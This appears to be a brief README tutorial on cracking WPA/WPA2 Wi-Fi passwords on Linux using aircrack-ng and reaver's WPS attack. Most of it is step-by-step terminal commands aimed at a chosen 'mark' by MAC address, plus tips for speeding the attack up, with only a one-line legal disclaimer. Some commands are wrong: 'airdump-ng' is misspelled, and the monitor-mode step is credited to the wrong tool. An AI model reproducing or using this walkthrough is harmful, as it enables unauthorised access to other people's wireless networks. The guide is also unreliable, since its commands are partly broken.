# How to crack wpa/wpa2 passwords with linux (tested on ubuntu and Elementary OS)

In order to crack wifi passwords with linux you need to install __aircrack-ng__ and __reaver__.

How to isntall aircrack-ng: www.aircrack-ng.org/install.html

Downloading reaver: http://code.google.com/p/reaver-wps/downloads/list

You might also need to install on you computer __libpcap-dev__ and __libsqlite3-dev__, in order to do that just type the following lines in the terminal:
```
$ sudo apt-get install libpcap-dev
```
AND
```
$ sudo apt-get install libsqlite3-dev
```

## Now, Lets start the attack

#### if the next lines of code does not work, all you need to do is to type sudo in front of each one

1. Firstly, disconnect yourself from any wifi networks and type this code:
```
$ airmon-ng start wlan0
```

2. Next you need to put your wifi adapter into monitor mode, which will list all available wifi signals around you.
```
$ airdump-ng mon0
```
Once airdump list all availble wifi signals around, you can move to the next step, the actual attack.

3.After you decide who is you mark, just write this command with the marks` mac adress in order to start the attack.
```
$ reaver -i mon0 -b 00:11:22:33:44:55 -vv
```

## Cracking wifi passwords can be against the law in your country. You should not do this at all!

##TRICKS:

1. Speading the attack
```
$ reaver -i mon0 -b 00:01:02:03:04:05 -vv -d 0
```
OR
```
$ reaver -i mon0 -b 00:01:02:03:04:05 -vv --dh-small
```
